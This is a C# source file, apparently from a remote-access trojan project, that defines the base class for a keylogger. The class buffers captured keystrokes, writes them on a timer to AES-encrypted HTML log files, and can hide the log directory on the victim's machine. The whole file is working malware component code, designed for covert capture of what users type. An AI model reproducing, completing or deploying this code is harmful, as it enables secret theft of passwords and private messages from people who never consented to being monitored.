using Q3C273.Shared.Cryptography;
using Q3C273.Shared.Helpers;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using Ton618.Config;
using Timer = System.Timers.Timer;

namespace Ton618.Logging
{
    /// <summary>
    /// This class provides keylogging functionality and modifies/highlights the output for
    /// better user experience.
    /// </summary>
    public abstract class LoggerBase : IDisposable
    {
        /// <summary>
        /// <c>True</c> if the class has already been disposed, else <c>false</c>.
        /// </summary>
        public bool IsDisposed { get; private set; }

        /// <summary>
        /// The timer used to periodically flush the <see cref="LogBuffer"/> from memory to disk.
        /// </summary>
        private readonly Timer flushTimer;
        protected StringBuilder LogBuffer { get; } = new StringBuilder();

        /// <summary>
        /// Provides encryption and decryption methods to securely store log files.
        /// </summary>
        private readonly Aes256 aes = new Aes256(Settings.ENCRYPTIONKEY);

        private readonly string logName;

        /// <summary>
        /// The maximum size of a single log file.
        /// </summary>
        private readonly long maxLogFileSize;

        /// <summary>
        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
        public LoggerBase(string logName, double flushInterval, long maxLogFileSize)
        {
            this.logName = logName;
            this.maxLogFileSize = maxLogFileSize;
            flushTimer = new Timer { Interval = flushInterval };
            flushTimer.Elapsed += Flush;
        }

        public void Start()
        {
            OnStart();
            flushTimer.Start();
        }

        private void Flush(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (LogBuffer.Length > 0)
                WriteFile();
        }

        protected virtual void OnWriteHeader() { }

        /// <summary>
        /// Writes the logged keys from memory to disk.
        /// </summary>
        private void WriteFile()
        {
            // TODO: Add some house-keeping and delete old log entries
            var writeHeader = false;

            var fileName = LogFileNameSupplier(0);
            var filePath = Path.Combine(Settings.LOGSPATH, fileName);

            try
            {
                var di = new DirectoryInfo(Settings.LOGSPATH);

                if (!di.Exists)
                    di.Create();

                if (Settings.HIDELOGDIRECTORY)
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                var i = 1;
                var prevName = filePath;
                while (File.Exists(filePath))
                {
                    // Large log files take a very long time to read, decrypt and append new logs to,
                    // so create a new log file if the size of the previous one exceeds maxLogFileSize.
                    var length = new FileInfo(filePath).Length;
                    if (length < maxLogFileSize)
                        break;

                    // append a number to the file name
                    fileName = LogFileNameSupplier(i);
                    filePath = Path.Combine(Settings.LOGSPATH, fileName);
                    if (prevName.Equals(filePath, StringComparison.OrdinalIgnoreCase)) // Prevent infinite loop if the client builder omitted file index template
                        filePath = Path.Combine(Settings.LOGSPATH, $"{Path.GetFileName(filePath)}_{i}");
                    i++;
                }

                if (!File.Exists(filePath))
                    writeHeader = true;

                var logFile = new StringBuilder();

                if (writeHeader)
                {
                    logFile
                        .Append("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log '")
                        .Append(logName)
                        .Append("' created on ")
                        .Append(DateTime.Now.ToString("f", DateTimeFormatInfo.InvariantInfo))
                        .Append(" Local, ")
                        .Append(DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo))
                        .Append(" UTC<br><br>")
                        .Append("<style>.h { color: 0000ff; display: inline; }</style>");

                    OnWriteHeader();
                }

                if (LogBuffer.Length > 0)
                    logFile.Append(LogBuffer);

                FileHelper.WriteLogFile(filePath, logFile.ToString(), aes);

                logFile.Clear();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Failed to write log because of an exception: " + ex);
            }

            LogBuffer.Clear();
        }

        /// <summary>
        /// Disposes used resources by this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed)
                return;

            if (disposing)
            {
                OnDispose();
                flushTimer.Stop();
                flushTimer.Dispose();
                WriteFile();
            }

            IsDisposed = true;
        }

        protected virtual void OnStart() { }

        protected virtual void OnDispose() { }

        protected abstract string LogFileNameSupplier(int fileIndex);
    }
}
